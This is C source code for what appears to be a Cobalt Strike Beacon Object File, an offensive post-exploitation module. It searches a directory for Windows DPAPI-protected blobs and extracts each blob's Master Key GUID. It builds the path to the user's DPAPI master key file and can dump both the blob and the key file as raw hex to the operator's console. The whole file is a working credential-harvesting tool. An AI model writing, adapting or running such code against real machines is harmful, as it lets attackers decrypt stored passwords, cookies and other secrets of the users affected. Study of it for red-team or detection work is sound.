#include <windows.h>
#include <sddl.h>
#include "beacon.h"
#include "utils.h"

// Global output object managed by BeaconFormat API
formatp outputbuffer;
BOOL g_DUMP_RAW = FALSE;

// Helper to read a file and append its hex representation to the output buffer
void dumpFileBytes(char* filePath) {
    if (!g_DUMP_RAW) return;

    HANDLE hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconFormatPrintf(&outputbuffer, "[-] Could not open for dumping: %s\n", filePath);
        return;
    }

    char buffer[1024];
    DWORD bytesRead = 0;
    if (KERNEL32$ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
        BeaconFormatPrintf(&outputbuffer, "[*] Raw bytes for %s (%d bytes):\n", filePath, bytesRead);
        for (DWORD i = 0; i < bytesRead; i++) {
            BeaconFormatPrintf(&outputbuffer, "\\x%02X", (unsigned char)buffer[i]);
            // Format output into 32-byte chunks for readability
            if ((i + 1) % 32 == 0) BeaconFormatPrintf(&outputbuffer, "\n");
        }
        BeaconFormatPrintf(&outputbuffer, "\n[+] End of Dump\n");
    }
    KERNEL32$CloseHandle(hFile);
}

// Core logic: Parses a DPAPI blob to extract the associated Master Key GUID
void parseFile(char* filePath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    char buffer[1024];
    DWORD bytesRead;
    
    char *szSid = NULL;
    wchar_t* szLocalDesc = NULL;
    char mkPath[MAX_PATH] = {0};
    char guidStr[37] = {0};
    DWORD descLen = 0;

    hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    if (!KERNEL32$ReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        KERNEL32$CloseHandle(hFile);
        return;
    }
    KERNEL32$CloseHandle(hFile);

    // DPAPI Blob header "magic" bytes (Version 1, Provider GUID: {df9d8cd0-1501-11d1-8c7a-00c04fc297eb})
    static char magic[] = { 0x01,0x00,0x00,0x00,0xD0,0x8C,0x9D,0xDF,0x01,0x15,0xD1,0x11,0x8C,0x7A,0x00,0xC0,0x4F,0xC2,0x97,0xEB };
    int idx = IndexOfBytes(buffer, (int)bytesRead, magic, sizeof(magic));

    if (idx >= 0) {
        BeaconFormatPrintf(&outputbuffer, "[+] Found DPAPI blob: %s\n", filePath);
        dumpFileBytes(filePath);

        // 1. Extract Description
        int indxDesc = idx + 44;
        descLen = *(DWORD*)(buffer + indxDesc);

        if (descLen > 2 && descLen < 1024) {
            wchar_t* szDescRaw = (wchar_t*)(buffer + indxDesc + 4);
            if ((indxDesc + 4 + descLen) <= bytesRead) {
                szLocalDesc = (wchar_t*)malloc(descLen + 2);
                if (szLocalDesc) {
                    MSVCRT$memcpy(szLocalDesc, szDescRaw, descLen);
                    szLocalDesc[descLen / 2] = L'\0';
                    BeaconFormatPrintf(&outputbuffer, "[*] Description: %ls\n", szLocalDesc);
                }
            }
        }

        // 2. Extract and Format Master Key GUID (starts 24 bytes after the magic header)
        char mkGuidRaw[16];
        memcpy(mkGuidRaw, buffer + idx + 24, 16);

        // Break down GUID into components to handle little-endian formatting
        char g1[4], g2[2], g3[2], g4[2], g5[6];
        memcpy(g1, mkGuidRaw, 4); memcpy(g2, mkGuidRaw + 4, 2); memcpy(g3, mkGuidRaw + 6, 2);
        memcpy(g4, mkGuidRaw + 8, 2); memcpy(g5, mkGuidRaw + 10, 6);
        
        // DPAPI GUIDs store the first three blocks in Little-Endian
        reverseBytes(g1, 4); reverseBytes(g2, 2); reverseBytes(g3, 2);

        // Format raw bytes into a standard GUID string (e.g., AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE)
        snprintf(guidStr, sizeof(guidStr), 
            "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
            (unsigned char)g1[0], (unsigned char)g1[1], (unsigned char)g1[2], (unsigned char)g1[3],
            (unsigned char)g2[0], (unsigned char)g2[1], (unsigned char)g3[0], (unsigned char)g3[1],
            (unsigned char)g4[0], (unsigned char)g4[1], (unsigned char)g5[0], (unsigned char)g5[1],
            (unsigned char)g5[2], (unsigned char)g5[3], (unsigned char)g5[4], (unsigned char)g5[5]);

        // 3. Get current user SID to build the path to the expected Master Key file
        HANDLE hToken;
        if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            DWORD len = 0;
            ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
            PTOKEN_USER pTUser = (PTOKEN_USER)malloc(len);
            if (pTUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, pTUser, len, &len)) {
                char *tempSid = NULL;
                if (ADVAPI32$ConvertSidToStringSidA(pTUser->User.Sid, &tempSid)) {
                    // We duplicate the SID string so we can manage it ourselves for the CSV
                    size_t sidLen = strlen(tempSid);
                    szSid = (char*)malloc(sidLen + 1);
                    if (szSid) memcpy(szSid, tempSid, sidLen + 1);
                    
                    char szProfilePath[MAX_PATH];
                    if (KERNEL32$GetEnvironmentVariableA("USERPROFILE", szProfilePath, MAX_PATH) > 0) {
                        // Construct path to the Master Key file in AppData
                        snprintf(mkPath, MAX_PATH, "%s\\AppData\\Roaming\\Microsoft\\Protect\\%s\\%s", 
                                 szProfilePath, szSid, guidStr);
                        BeaconFormatPrintf(&outputbuffer, "[*] Master Key GUID: %s\n", guidStr);
                        dumpFileBytes(mkPath);
                    }
                    KERNEL32$LocalFree(tempSid); // Free the one allocated by Windows
                }
            }
            if (pTUser) free(pTUser);
            KERNEL32$CloseHandle(hToken);
        }

        BeaconFormatPrintf(&outputbuffer, "- - - - - - - - - - - - - - - - -\n");

        // --- CLEANUP ---
        if (szLocalDesc) free(szLocalDesc);
        if (szSid) free(szSid);
    }
}

// Entry point for the BOF
void go(char* args, int len) {
    datap parser;
    char* searchMask = NULL;
    int searchMaskLen = 0;
    int dumpFlag = 0;

    // Extract arguments passed from the Aggressor Script
    BeaconDataParse(&parser, args, len);
    searchMask = BeaconDataExtract(&parser, &searchMaskLen);
    dumpFlag = BeaconDataInt(&parser);
    g_DUMP_RAW = (dumpFlag == 1) ? TRUE : FALSE;

    // Allocate the dynamic output buffer (initially 16KB) should it be lower?
    BeaconFormatAlloc(&outputbuffer, 16384);

    if (searchMask == NULL) {
        BeaconFormatPrintf(&outputbuffer, "[-] No search path provided.\n");
    } else {
        // Prepare the directory path for file concatenation
        char baseDir[MAX_PATH];
        snprintf(baseDir, MAX_PATH, "%s", searchMask);
        int maskLen = (int)strlen(baseDir);
        if (maskLen > 0 && baseDir[maskLen - 1] == '*') {
            baseDir[maskLen - 1] = '\0';
        }

        // Standard Windows API directory iteration
        WIN32_FIND_DATAA fd;
        HANDLE hFind = KERNEL32$FindFirstFileA(searchMask, &fd);

        if (hFind == INVALID_HANDLE_VALUE) {
            BeaconFormatPrintf(&outputbuffer, "[-] Path not found: %s\n", searchMask);
        } else {
            do {            
                // Skip the '.' and '..' directory entries
                if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                    char fullPath[MAX_PATH];
                    snprintf(fullPath, MAX_PATH, "%s%s", baseDir, fd.cFileName);                    
                    parseFile(fullPath);
                }
            } while (KERNEL32$FindNextFileA(hFind, &fd));
            KERNEL32$FindClose(hFind);
        }
    }

    BeaconFormatPrintf(&outputbuffer, "[+] BOF Finished.\n");

    // Flush the dynamic buffer to the Beacon console
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));

    // Release the heap memory back to the system
    BeaconFormatFree(&outputbuffer);
}